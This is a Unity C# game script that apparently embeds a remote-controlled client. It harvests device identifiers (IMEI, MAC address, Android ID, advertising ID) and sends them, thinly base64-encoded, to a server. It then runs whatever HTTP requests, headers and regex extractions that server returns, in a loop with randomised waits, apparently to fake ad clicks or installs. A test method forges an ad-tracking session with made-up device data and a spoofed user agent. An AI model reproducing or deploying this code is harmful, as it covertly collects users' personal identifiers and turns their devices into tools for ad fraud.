using UnityEngine;
using System.Collections;
using System;
using System.Text;
using System.Collections.Generic;
using System.Linq;
using System.Xml.Serialization;
using System.IO;
using Poseidon.Web.Model;
using System.Text.RegularExpressions;

public class Server : MonoBehaviour
{

	public static string ServiceURL = "http://192.168.0.250/Poseidon.Web/svc.asmx/Interact"; //http://poseidon.servegame.org:8080/svc.asmx/Interact
	public static string ADID = "622466FE-C0EA-4905-AA2F-72370577DB5C";
	public static string Country = "No Android";
	public static string Imei = "No Android";
	public static string mac1 = "No Android";
	public static string mac2 = "No Android";
	public static string OSVersion = "23";
	public static string UDID = "4DC86DA4D7791076";
	public static string Model = "SAMSUNG SM-G935F";
	public string Package = "";
	public static string Package_ = "";
	public static PoseidonResult UltronGlobal;
	public static string Session = "";
	public string Ip;
	public static int initwait = 0; 

	public static int FIRST=0;

	void Start ()
	{








		Package_ = Package;


		FIRST=PlayerPrefs.GetInt("first_launch");

		PlayerPrefs.SetInt ("first_launch", 1);


		ServiceURL = Ip;
		Debug.Log (ServiceURL);
		//	StartCoroutine (test ());

	
		ADID = DeviceInfo.GetAdvertisingID ();
		try {
			
		
		Country = PreciseLocale.GetLanguageID ();
		} catch (Exception ex) {

		}
		Imei = DeviceInfo.GetDeviceIMEI ();
		mac1 = DeviceInfo.GetMacAdress ();
		//mac2 = DeviceInfo.GetEthMacAdress ();
		OSVersion = DeviceInfo.GetOSversion ();
		UDID = DeviceInfo.GetAndroidID ();
		Model = DeviceInfo.GetDeviceModel ();
		Debug.Log (Country);

		StartCoroutine (StartSession ());
		StartCoroutine (Crach ());
	}

	public static int IsCrach;

	IEnumerator Crach()
	{
		WWWForm form = new WWWForm ();
		WWW www = new WWW (ServiceURL.Replace("/Interact","")+"/GetBugEnabled");
		yield return www;
		if (String.IsNullOrEmpty (www.error)) {

			var nicoconnard = (XmlDeserializeObject<string> (www.text));

			IsCrach = int.Parse(nicoconnard);
			Debug.Log ("Crach : " + IsCrach);
			www.Dispose ();
			www = null;
		
		} 
		else {
			Debug.LogError (www.error);
			www.Dispose ();
			www = null;

		}

	}


	IEnumerator StartSession ()
	{
		

		PoseidonInput bite = new PoseidonInput ();
		bite.Method = "StartSession";
		bite.Model = Model;
		bite.OsVersion = OSVersion;
		bite.CountryCode = Country;
		bite.GoogleAdId = ADID;
		bite.IMEI = Imei;
		bite.Package = Package;
		bite.UdId = UDID;
		bite.MAC1 = mac1;
		bite.MAC2 = mac2;

		var pd = XmlSerializeObject<PoseidonInput> (bite);

		pd = Encrypt (pd);


		/*	+  "&GOOGLEADID=" + ADID +
			"&COUNTRYCODE=" + Country +
			"&IMEI=" + Imei +
			"&MAC1=" + mac1 +
			"&MAC2=" + mac2 +
			"&MODEL=" + Model+
			"&OSVERSION=" + OSVersion +
			"&UDID=" + UDID +
			"&PACKAGE=" + Package
		);*/
			
		WWWForm form = new WWWForm ();
		form.AddField ("Data", pd);
		WWW www = new WWW (ServiceURL, form);
		yield return www;
		if (String.IsNullOrEmpty (www.error)) {
			
			var nicoconnard = XmlDeserializeObject<PoseidonResult> (Decrypt (XmlDeserializeObject<string> (www.text)));

			Debug.Log (nicoconnard.IdSession);
			initwait = nicoconnard.LoadDuration;
			Session = nicoconnard.IdSession.ToString ();
			www.Dispose ();
			www = null;


			StartCoroutine (Ultron ());

		} else {
			Debug.LogError (www.error);
			www.Dispose ();
			www = null;

		}

	}


	string PrepareRequest (PoseidonInput poseidonInput)
	{

		poseidonInput.Model = Model;
		poseidonInput.OsVersion = OSVersion;
		poseidonInput.CountryCode = Country;
		poseidonInput.GoogleAdId = ADID;
		poseidonInput.IMEI = Imei;
		poseidonInput.Package = Package;
		poseidonInput.UdId = UDID;
		poseidonInput.MAC1 = mac1;
		poseidonInput.MAC2 = mac2;
		poseidonInput.IdSession = int.Parse (Session);

		var pd = XmlSerializeObject<PoseidonInput> (poseidonInput);

		pd = Encrypt (pd);

		return pd;





	}



	IEnumerator Ultron ()
	{
		var PoseidonInput = new PoseidonInput ();
		PoseidonInput.Method = "GetSubRequest";
		PoseidonInput.Step = "Init";
		var content = PrepareRequest (PoseidonInput);

		WWWForm form = new WWWForm ();
		form.AddField ("Data", content);
		WWW www = new WWW (ServiceURL, form);
		yield return www;
		if (String.IsNullOrEmpty (www.error)) {

			UltronGlobal = XmlDeserializeObject<PoseidonResult> (Decrypt (XmlDeserializeObject<string> (www.text)));
			Debug.Log (UltronGlobal.BasicResult);
			www.Dispose ();
			www = null;

			foreach (var item in UltronGlobal.Items) {
				StartCoroutine (Ultron_ProcessRequest (item));
			}



		} else {
			Debug.LogError (www.error);
			www.Dispose ();
			www = null;

		}

	}


	public bool IsWWWError (WWW www)
	{
		var result = false;

		if (www == null)
			return result;
		
		if (!String.IsNullOrEmpty (www.error)) {
			result = true;

			/*if (www.responseHeaders.ContainsKey ("LOCATION")) {
				result = false;
			}*/
			/*var status = www.responseHeaders.Where (w => w.Key.ToLower ().Contains ("status")).Select (s => s.Value).FirstOrDefault ();
			if (status.Contains ("302") || status.Contains ("303") || status.Contains ("307")) {
				result = false;
			} */

			if (www.error.ToLower ().Contains ("market"))
				result = false;
		
		}

		return result;
	}


	IEnumerator Ultron_ProcessRequest (PoseidonDataItem item)
	{
		
		/*byte[] postdata=new byte[0];
			
		if (!String.IsNullOrEmpty (item.PostData))
			postdata=System.Text.Encoding.ASCII.GetBytes (item.PostData);
		else {
			postdata = null;
			Debug.Log ("nico connard");
				
		}*/

		/*if (!String.IsNullOrEmpty (item.PostData))
			item.PostData = "";*/
		WWW www = null;
		if (!string.IsNullOrEmpty (item.Request)) {
		
			if (String.IsNullOrEmpty (item.PostData))
				www = new WWW (item.Request, null, item.Headers.ToDictionary (k => k.Key, v => v.Value));
			else
				www = new WWW (item.Request, System.Text.Encoding.ASCII.GetBytes (item.PostData), item.Headers.ToDictionary (k => k.Key, v => v.Value));

			yield return www;
		}
		//

	/*	if (item.CurrentStep.ToLower ().Contains ("_click")) {
			Debug.Log (DateTime.Now.ToString ("[hh:mm:ss]") + " Wait click :" + 5);
			yield return new WaitForSeconds (15);
			Debug.Log (DateTime.Now.ToString ("[hh:mm:ss]") + " Wait click end");
		}*/



		//if (String.IsNullOrEmpty (www.error)) {
		if (!IsWWWError (www)) {
			
			/*if (www.responseHeaders.ContainsKey ("LOCATION")) {
				item.Request = www.responseHeaders ["LOCATION"];
				StartCoroutine (Ultron_ProcessRequest (item));
			} else {*/


				

			var PoseidonInput = new PoseidonInput ();
			PoseidonInput.Method = "GetSubRequest";
			PoseidonInput.Step = item.NextStep;
			PoseidonInput.GenericParameter = item;
			if (www != null) {
				//if (www.responseHeaders//
				//Debug.Log (string.Join ("|", www.responseHeaders.Select (s => s.Key + "/" + s.Value).ToArray ()));
				//var alexestdebilelist = www.responseHeaders.Where (w => w.Key.ToLower ().Contains ("location"));
				//if (alexestdebilelist.Count()>0) {
				//	Debug.Log ("grosse couille");
				//	var alexestdebile = alexestdebilelist.FirstOrDefault ();
				//	if (alexestdebile.Value.ToLower ().Contains ("market")) {
				//		PoseidonInput.GenericParameter.Result = alexestdebile.Value;
				//		Debug.Log (alexestdebile.Value);
				//	}

				

				//if (www.responseHeaders.ContainsKey ("LOCATION")) {
				//	if (www.responseHeaders ["LOCATION"].Contains ("market"))
				//		PoseidonInput.GenericParameter.Result = www.responseHeaders ["LOCATION"];

				if (string.IsNullOrEmpty (item.RegexToTest)) {
					PoseidonInput.GenericParameter.Result = www.text;
				} else {
					PoseidonInput.GenericParameter.Result = string.Join ("|", Regex.Matches (www.text, item.RegexToTest).Cast<Match> ().Select (s => s.Value).ToArray ());
				}
							
			}

			var content = PrepareRequest (PoseidonInput);
			//
			WWWForm form2 = new WWWForm ();
			form2.AddField ("Data", content);
			WWW www2 = new WWW (ServiceURL, form2);
			yield return www2;
			if (String.IsNullOrEmpty (www2.error)) {

				PoseidonResult result = XmlDeserializeObject<PoseidonResult> (Decrypt (XmlDeserializeObject<string> (www2.text)));
				Debug.Log (result.BasicResult + " " + result.Items [0].CurrentStep);
				www2.Dispose ();
				www2 = null;


				if (item.IsWait) {
					var r = UnityEngine.Random.Range (item.MinWait, item.MaxWait);
					Debug.Log (DateTime.Now.ToString ("[hh:mm:ss]") + " Wait :" + r);
					yield return new WaitForSeconds (r);
					Debug.Log (DateTime.Now.ToString ("[hh:mm:ss]") + " Wait end");

				}
					
				if (!result.Items [0].IsFinished) {
					/*	if (string.IsNullOrEmpty (result.Items [0].Request))
						result.Items [0].CurrentStep = result.Items [0].NextStep;*/
						
					StartCoroutine (Ultron_ProcessRequest (result.Items [0]));
				} else
					Debug.Log ("END");


			} else
				Debug.Log (www2.error);
			//}
				

		} else
			Debug.Log (www.error);
		

	}



	// Update is called once per frame
	void Update ()
	{
	
	}

	public static string Encrypt (string Input)
	{
		//return Input;
		return Convert.ToBase64String (Encoding.Unicode.GetBytes (Input));
		//return ZipUnity3D(Input);
	}


	public static string Decrypt (string Input)
	{
		//return Input;
		return Encoding.Unicode.GetString (Convert.FromBase64String (Input));
		//return UnZipUnity3D(Input);
	}




	/*public  static string Encrypt(string Input)
	{
		var result = "";
		var seed = new System.Random().Next(0, 20);
		var abc = ABC(seed);
		var s64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(Input));
		for (int i = 0; i < s64.Length; i++)
			if (abc.ContainsKey(char.ToLower(s64[i])))
			if (char.IsUpper(s64[i]))
				result += char.ToUpper(abc[char.ToLower(s64[i])]);
			else
				result += abc[char.ToLower(s64[i])];
			else
				result += s64[i];
		return result.Insert(5, seed.ToString().PadLeft(3, '0'));
	}*/

	public static Dictionary<char, char> ABC (int seed)
	{
		var result = new Dictionary<char, char> ();
		var ori = new List<char> ();
		for (int i = 0; i <= 25; i++) {
			ori.Add ((char)(i + 97));
		}
		var dest = ori.Skip (seed).ToList ();
		dest.AddRange (ori.Take (seed));
		for (int i = 0; i < dest.Count; i++)
			result.Add (ori [i], dest [i]);
		return result;
	}


	public static T XmlDeserializeObject<T> (string toDeserialize)
	{
		XmlSerializer xmlSerializer = new XmlSerializer (typeof(T));
		StringReader textReader = new StringReader (toDeserialize);

		return (T)xmlSerializer.Deserialize (textReader);
	}


	public static string XmlSerializeObject<T> (T toSerialize)
	{
		XmlSerializer xmlSerializer = new XmlSerializer (typeof(T));
		StringWriter textWriter = new StringWriter ();

		xmlSerializer.Serialize (textWriter, toSerialize);
		return textWriter.ToString ();
	}


	/*	public static string Decrypt(string Input)
	{
		var result = "";
		if (string.IsNullOrEmpty(Input)) return result;

		var seed = int.Parse(Input.Substring(5, 3));
		Input = Input.Substring(0, 5) + Input.Substring(8);
		var cba = CBA(seed);
		for (int i = 0; i < Input.Length; i++)
			if (cba.ContainsKey(char.ToLower(Input[i])))
			if (char.IsUpper(Input[i]))
				result += char.ToUpper(cba[char.ToLower(Input[i])]);
			else
				result += cba[char.ToLower(Input[i])];
			else
				result += Input[i];
		return Encoding.Unicode.GetString(Convert.FromBase64String(result));
	}*/
	private static Dictionary<char, char> CBA (int seed)
	{
		var result = new Dictionary<char, char> ();
		var abc = ABC (seed);
		for (int i = 0; i < abc.Count; i++)
			result.Add (abc.Values.ToList () [i], abc.Keys.ToList () [i]);
		return result;
	}



	public static string  GetDatadata()
	{

		string path = "";
		#if UNITY_ANDROID && !UNITY_EDITOR
		try {
		IntPtr obj_context = AndroidJNI.FindClass("android/content/ContextWrapper");
		IntPtr method_getFilesDir = AndroidJNIHelper.GetMethodID(obj_context, "getFilesDir", "()Ljava/io/File;");

		using (AndroidJavaClass cls_UnityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer")) {
		using (AndroidJavaObject obj_Activity = cls_UnityPlayer.GetStatic<AndroidJavaObject>("currentActivity")) {
		IntPtr file = AndroidJNI.CallObjectMethod(obj_Activity.GetRawObject(), method_getFilesDir, new jvalue[0]);
		IntPtr obj_file = AndroidJNI.FindClass("java/io/File");
		IntPtr method_getAbsolutePath = AndroidJNIHelper.GetMethodID(obj_file, "getAbsolutePath", "()Ljava/lang/String;");   

		path = AndroidJNI.CallStringMethod(file, method_getAbsolutePath, new jvalue[0]);                    

		if(path != null) {
		Debug.Log("Got internal path: " + path);
		}
		else {
		Debug.Log("Using fallback path");
		path = "/data/data/Package_/files";
		}
		}
		}
		}
		catch(Exception e) {
		Debug.Log(e.ToString());
		}
		#else
		path = Application.persistentDataPath;
		#endif

		return path;

	}


	IEnumerator test ()
	{

		var ttt = System.Text.Encoding.ASCII.GetBytes ("{\"IsAdvertiserTrackingEnabled\":false,\"AppId\":\"30874\",\"BuildType\":\"Unity\",\"DeviceGenerationInfo\":\"3006\",\"DeviceLanguageCode\":\"nl\",\"IsHacked\":false,\"IsOnWifi\":false,\"IsUsingSdk\":true,\"IsOfferCacheAvailable\":true,\"OSVersion\":\"4.4.4\",\"PublisherUserId\":\"\",\"PublisherSDKVersion\":\"5.5.5\",\"UDIDs\":[{\"Type\":\"12\",\"Value\":\"fd5780de-6ae5-42ab-8fb4-f13271f332df\"}],\"WebViewUserAgent\":\"Mozilla/5.0 (Linux; U; Android 4.4.4;nl-nl; 3006 Build) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30\"}");

		var prout = new Dictionary<string,string> ();
		prout.Add ("Content-Type", "application/json");
		prout.Add ("User-Agent", "gzip");
		prout.Add ("Host", "appclick.co");
		prout.Add ("Accept", "application/json");

		WWW www = new WWW ("http://appclick.co/PublicServices/MobileTrackingApiRestV1.svc/CreateSessionV2?appId=30874", ttt, prout);

		yield return www;

		Debug.Log ("Test :" + www.text);
	}

}
